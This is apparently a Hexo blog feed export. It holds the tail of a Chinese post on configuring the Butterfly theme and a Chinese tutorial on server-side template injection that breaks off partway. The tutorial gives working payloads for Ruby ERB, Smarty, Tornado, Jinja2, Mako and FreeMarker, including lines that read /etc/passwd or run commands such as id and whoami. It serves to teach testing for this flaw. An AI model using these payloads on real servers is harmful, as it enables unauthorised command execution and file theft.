51, 0.1) 0,</span><br><span class="line">    rgba(243, 112, 85, 0.1) 15%,</span><br><span class="line">    rgba(239, 78, 123, 0.1) 30%,</span><br><span class="line">    rgba(161, 102, 171, 0.1) 44%,</span><br><span class="line">    rgba(80, 115, 184, 0.1) 58%,</span><br><span class="line">    rgba(16, 152, 173, 0.1) 72%,</span><br><span class="line">    rgba(7, 179, 155, 0.1) 86%,</span><br><span class="line">    rgba(109, 186, 130, 0.1) 100%</span><br><span class="line">  );</span><br><span class="line">  background: -moz-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(247, 149, 51, 0.1) 0,</span><br><span class="line">    rgba(243, 112, 85, 0.1) 15%,</span><br><span class="line">    rgba(239, 78, 123, 0.1) 30%,</span><br><span class="line">    rgba(161, 102, 171, 0.1) 44%,</span><br><span class="line">    rgba(80, 115, 184, 0.1) 58%,</span><br><span class="line">    rgba(16, 152, 173, 0.1) 72%,</span><br><span class="line">    rgba(7, 179, 155, 0.1) 86%,</span><br><span class="line">    rgba(109, 186, 130, 0.1) 100%</span><br><span class="line">  );</span><br><span class="line">  background: -o-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(247, 149, 51, 0.1) 0,</span><br><span class="line">    rgba(243, 112, 85, 0.1) 15%,</span><br><span class="line">    rgba(239, 78, 123, 0.1) 30%,</span><br><span class="line">    rgba(161, 102, 171, 0.1) 44%,</span><br><span class="line">    rgba(80, 115, 184, 0.1) 58%,</span><br><span class="line">    rgba(16, 152, 173, 0.1) 72%,</span><br><span class="line">    rgba(7, 179, 155, 0.1) 86%,</span><br><span class="line">    rgba(109, 186, 130, 0.1) 100%</span><br><span class="line">  );</span><br><span class="line">  background: -ms-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(247, 149, 51, 0.1) 0,</span><br><span class="line">    rgba(243, 112, 85, 0.1) 15%,</span><br><span class="line">    rgba(239, 78, 123, 0.1) 30%,</span><br><span class="line">    rgba(161, 102, 171, 0.1) 44%,</span><br><span class="line">    rgba(80, 115, 184, 0.1) 58%,</span><br><span class="line">    rgba(16, 152, 173, 0.1) 72%,</span><br><span class="line">    rgba(7, 179, 155, 0.1) 86%,</span><br><span class="line">    rgba(109, 186, 130, 0.1) 100%</span><br><span class="line">  );</span><br><span class="line">  background: linear-gradient(</span><br><span class="line">    90deg,</span><br><span class="line">    rgba(247, 149, 51, 0.1) 0,</span><br><span class="line">    rgba(243, 112, 85, 0.1) 15%,</span><br><span class="line">    rgba(239, 78, 123, 0.1) 30%,</span><br><span class="line">    rgba(161, 102, 171, 0.1) 44%,</span><br><span class="line">    rgba(80, 115, 184, 0.1) 58%,</span><br><span class="line">    rgba(16, 152, 173, 0.1) 72%,</span><br><span class="line">    rgba(7, 179, 155, 0.1) 86%,</span><br><span class="line">    rgba(109, 186, 130, 0.1) 100%</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改配置文件<code>_config.butterfly.yml</code>的引入方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Inject</span><br><span class="line"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span><br><span class="line"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">     - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/background.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果背景色不生效，设置<code>_config.butterfly.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Website Background (設置網站背景)</span><br><span class="line"># can set it to color or image (可設置圖片 或者 顔色)</span><br><span class="line"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span><br><span class="line">background: &#x27;#efefef&#x27;</span><br></pre></td></tr></table></figure><h5 id="footer-背景"><a href="#footer-背景" class="headerlink" title="footer 背景"></a>footer 背景</h5><p>footer 的背景，当设置 <code>false</code> 时，将与主题色一致。</p><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># footer是否显示图片背景(与top_img一致)</span><br><span class="line">footer_bg: true</span><br></pre></td></tr></table></figure><h5 id="背景特效"><a href="#背景特效" class="headerlink" title="背景特效"></a>背景特效</h5><p>有三种，自己选择开启，将<code>enable</code>设置为true就可以</p><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Background effects (背景特效)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># canvas_ribbon (静止彩带)</span><br><span class="line"># See: https://github.com/hustcc/ribbon.js</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  size: 150</span><br><span class="line">  alpha: 0.6</span><br><span class="line">  zIndex: -1</span><br><span class="line">  click_to_change: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Fluttering Ribbon (动态彩带)</span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line">#星空特效</span><br><span class="line"># canvas_nest</span><br><span class="line"># https://github.com/hustcc/canvas-nest.js</span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: true</span><br><span class="line">  color: &#x27;0,0,255&#x27; #color of lines, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(note: use &#x27;,&#x27; to separate.)</span><br><span class="line">  opacity: 0.7 # the opacity of line (0~1), default: 0.5.</span><br><span class="line">  zIndex: -1 # z-index property of the background, default: -1.</span><br><span class="line">  count: 99 # the number of lines, default: 99.</span><br><span class="line">  mobile: false</span><br></pre></td></tr></table></figure><h4 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h4><ul><li>安装依赖</li></ul><p>前往博客根目录，打开cmd命令窗口执行npm install hexo-generator-search –save。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><ul><li>注入配置</li></ul><p>修改站点配置文件<code>_config.yml</code>，添加如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: true</span><br></pre></td></tr></table></figure><ul><li>主题中开启搜索</li></ul><p>在主题配置文件<code>_config.butterfly.yml</code>中修改以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line">-  enable: false</span><br><span class="line">+  enable: true</span><br></pre></td></tr></table></figure><ul><li>重新编译运行，即可看到效果。</li></ul><p>前往博客根目录，打开cmd命令窗口依次执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo generate</span><br><span class="line">hexo s -p 8000</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h2 id="hexo命令"><a href="#hexo命令" class="headerlink" title="hexo命令"></a>hexo命令</h2><ul><li>hexo init</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init 命令用于初始化一个本地文件夹为网站的根目录</span><br></pre></td></tr></table></figure><ul><li>hexo new</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new title 新建一篇文章</span><br></pre></td></tr></table></figure><ul><li>hexo generate</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate 可以简写成 hexo g</span><br><span class="line">该命令用于生成静态文件</span><br></pre></td></tr></table></figure><ul><li>hexo server</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server 命令用于启动本地服务器，一般可以简写成 hexo s</span><br><span class="line">可以加一些参数</span><br><span class="line">-p    选项，指定服务器端口，默认为 4000</span><br><span class="line">-i    选项，指定服务器 IP 地址，默认为 0.0.0.0</span><br><span class="line">-s    选项，静态模式 ，仅提供 public 文件夹中的文件并禁用文件监视</span><br></pre></td></tr></table></figure><ul><li>hexo deploy</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy 命令用于部署网站，一般可以简写成 hexo d</span><br></pre></td></tr></table></figure><ul><li>hexo clean</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean 命令用于清理缓存文件，是一个比较常用的命令</span><br></pre></td></tr></table></figure><ul><li>hexo –safe</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --safe 表示安全模式，用于禁用加载插件和脚本</span><br></pre></td></tr></table></figure><ul><li>hexo –debug</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --debug 表示调试模式，用于将消息详细记录到终端和 debug.log 文件</span><br></pre></td></tr></table></figure><ul><li>hexo –silent</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo --silent  表示静默模式，用于静默输出到终端</span><br></pre></td></tr></table></figure><h2 id="markdown-文件参数"><a href="#markdown-文件参数" class="headerlink" title="markdown 文件参数"></a>markdown 文件参数</h2><h3 id="page"><a href="#page" class="headerlink" title="page"></a>page</h3><p>新建的一些界面的要markdown 文件的文件头参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:【必需】页面标题</span><br><span class="line">date:【必需】页面创建日期</span><br><span class="line">updated:【必需】标籤、分类和友情链接三个页面需要配置</span><br><span class="line">type: 【可选】页面更新日期</span><br><span class="line">comments:【可选】页面描述</span><br><span class="line">description:【可选】页面关键字</span><br><span class="line">keywords:【可选】显示页面评论模块(默认 true)</span><br><span class="line">top_img:【可选】页面顶部图片</span><br><span class="line">mathjax:【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex:【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aside:【可选】显示侧边栏 (默认 true)</span><br><span class="line">aplayer:【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink:【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">title【必需】文章标题</span><br><span class="line">date【必需】文章创建日期</span><br><span class="line">updated【可选】文章更新日期</span><br><span class="line">tags【可选】文章标籤</span><br><span class="line">categories【可选】文章分类</span><br><span class="line">keywords【可选】文章关键字</span><br><span class="line">description【可选】文章描述</span><br><span class="line">top_img【可选】文章顶部图片</span><br><span class="line">cover【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</span><br><span class="line">comments【可选】显示文章评论模块(默认 true)</span><br><span class="line">toc【可选】显示文章TOC(默认为设置中toc的enable配置)</span><br><span class="line">toc_number【可选】显示toc_number(默认为设置中toc的number配置)</span><br><span class="line">toc_style_simple【可选】显示 toc 简洁模式</span><br><span class="line">copyright【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</span><br><span class="line">copyright_author【可选】文章版权模块的文章作者</span><br><span class="line">copyright_author_href【可选】文章版权模块的文章作者链接</span><br><span class="line">copyright_url【可选】文章版权模块的文章连结链接</span><br><span class="line">copyright_info【可选】文章版权模块的版权声明文字</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tzy1997.com/articles/hexo1600/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模板注入(ssti)</title>
      <link href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/"/>
      <url>/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文介绍模板注入。</p></blockquote><span id="more"></span><h4 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h4><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><h4 id="二、什么是服务端模板注入"><a href="#二、什么是服务端模板注入" class="headerlink" title="二、什么是服务端模板注入"></a>二、什么是服务端模板注入</h4><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;custom_email&#x27;</span>] , <span class="keyword">array</span>(<span class="string">&quot;first_name&quot;</span> =&gt; <span class="variable">$user</span>.first_name) );</span><br></pre></td></tr></table></figure><p>有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = <span class="string">&#x27;&#123;&#123;7*7&#125;&#125;&#x27;</span> %&#125;</span><br><span class="line">custom_email=&#123;&#123; openTag &#125;&#125; // GET 参数</span><br><span class="line"><span class="number">49</span>  // $output 结果</span><br></pre></td></tr></table></figure><p>还有更神奇的结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123;self&#125;&#125;&#x27; %&#125;</span><br><span class="line">custom_email=&#123;&#123; openTag &#125;&#125; // GET 参数</span><br><span class="line"> </span><br><span class="line">Object of class</span><br><span class="line">__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误</span><br></pre></td></tr></table></figure><p>我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p><p>为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p><h5 id="1：探测漏洞"><a href="#1：探测漏洞" class="headerlink" title="1：探测漏洞"></a>1：探测漏洞</h5><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：</p><h6 id="文本类"><a href="#文本类" class="headerlink" title="文本类"></a>文本类</h6><p>大部分的模板语言支持我们输入 HTML，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello &#123;user.name&#125;</span><br><span class="line">Hello user1</span><br><span class="line"> </span><br><span class="line">freemarker=Hello $&#123;username&#125;</span><br><span class="line">Hello newuser</span><br><span class="line"> </span><br><span class="line">any=&lt;b&gt;Hello&lt;/b&gt;</span><br><span class="line">&lt;b&gt;Hello&lt;b&gt;</span><br></pre></td></tr></table></figure><p>未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。除此之外，模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello $&#123;7*7&#125;</span><br><span class="line">Hello 49</span><br><span class="line"> </span><br><span class="line">freemarker=Hello $&#123;7*7&#125;</span><br><span class="line">Hello 49</span><br></pre></td></tr></table></figure><p>来确认漏洞。</p><h6 id="代码类"><a href="#代码类" class="headerlink" title="代码类"></a>代码类</h6><p>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting=username</span><br><span class="line">Hello user01</span><br></pre></td></tr></table></figure><p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting=username&lt;tag&gt;</span><br><span class="line">Hello</span><br><span class="line">personal_greeting=username&#125;&#125;&lt;tag&gt;</span><br><span class="line">Hello user01 &lt;tag&gt;</span><br></pre></td></tr></table></figure><h5 id="2：信息收集"><a href="#2：信息收集" class="headerlink" title="2：信息收集"></a>2：信息收集</h5><p>检测到模板注入后，我们需要判断具体的模板引擎。我们需要 fuzz 不同的字符，再通过返回的错误判断。当模板引擎屏蔽错误后，该类当法就失效了，并且暴力 fuzz 也对攻击自动化不友好。Burpsuite 则对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：</p><p><img src="/image/media/2022/ssti/ssti_1.jpg"></p><p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p><h4 id="三、测试方法"><a href="#三、测试方法" class="headerlink" title="三、测试方法"></a>三、测试方法</h4><blockquote><ul><li>确定使用的引擎</li><li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li><li>需找攻击面，尝试攻击</li></ul></blockquote><h5 id="1-测试用例"><a href="#1-测试用例" class="headerlink" title="1.测试用例"></a>1.测试用例</h5><p>简单的数学表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123; 7+7 &#125;&#125;&#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125; =&gt; 14</span><br></pre></td></tr></table></figure><p>字符串表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123; &quot;ajin&quot; &#125;&#125;&#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125; =&gt; ajin</span><br></pre></td></tr></table></figure><ul><li>Ruby</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;</span><br></pre></td></tr></table></figure><ul><li>Twig</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123;7*7&#125;&#125;&#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>Smarty</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125;</span><br></pre></td></tr></table></figure><ul><li>AngularJS</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$eval(&#x27;1+1&#x27;)</span><br></pre></td></tr></table></figure><ul><li>Tornado</li></ul><p>引用模块 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;% &#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;import module %&#125;=&gt; &#123;&#123; openTag &#125;&#125;import os %&#125;&#123;&#123; os.popen(&quot;whoami&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>Flask/Jinja2</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#123; &#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125; config.items() &#125;&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Django</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% assign openTag = &#x27;&#123;&#x27; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;&#123; request &#125;&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;% debug %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;% load module %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;% include &quot;x.html&quot; %&#125;</span><br><span class="line">&#123;&#123; openTag &#125;&#125;% extends &quot;x.html&quot; %&#125;</span><br></pre></td></tr></table></figure><h5 id="2-目标"><a href="#2-目标" class="headerlink" title="2.目标"></a>2.目标</h5><ul><li>创建对象</li><li>文件读写</li><li>远程文件包含</li><li>信息泄漏</li><li>提权</li></ul><h4 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h4><h5 id="1-读文档"><a href="#1-读文档" class="headerlink" title="1.读文档"></a>1.读文档</h5><p>读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：</p><ul><li>‘Template 使用手册’，这一部分通常告诉我们基本的模板语法</li><li>‘安全问题’，在攻击模板时，它通常可以提供我们许多思路</li><li>内建方法，函数，变量，过滤器</li><li>插件/扩展——我们可以优先研究默认开启的</li></ul><h5 id="2-探环境"><a href="#2-探环境" class="headerlink" title="2.探环境"></a>2.探环境</h5><p>当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数/对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。</p><p>如果没有这样的对象或函数，我们需要暴力枚举变量名。有些时候，开发者也会在模板中包含了一些敏感信息。</p><h5 id="3-黑程序"><a href="#3-黑程序" class="headerlink" title="3.黑程序"></a>3.黑程序</h5><p>不要局限目光于通用特性，我们还需注意到不同开发者的实现细节。</p><p>用模板注入来实现任意对象创建，任意文件读写，远程文件包含，信息泄露以及提权。</p><p>有些时候，攻破一个程序不需要多少时间，比如：{php}echo id;{/php}</p><p>这时，我们只需递交：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">x=os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">%&gt;</span><br><span class="line">$&#123;x&#125;</span><br></pre></td></tr></table></figure><p>即可，但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。</p><h4 id="五、案例"><a href="#五、案例" class="headerlink" title="五、案例"></a>五、案例</h4><h5 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h5><p>文档地址：<a href="https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security">https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security</a></p><p>FreeMaker 是 Java 下最受欢迎的模板引擎。用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Execute</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">TemplateMethodModel</span></span><br><span class="line"><span class="comment">/*给予FreeMaker执行命令权限，并将输入内联到模板里*/</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; 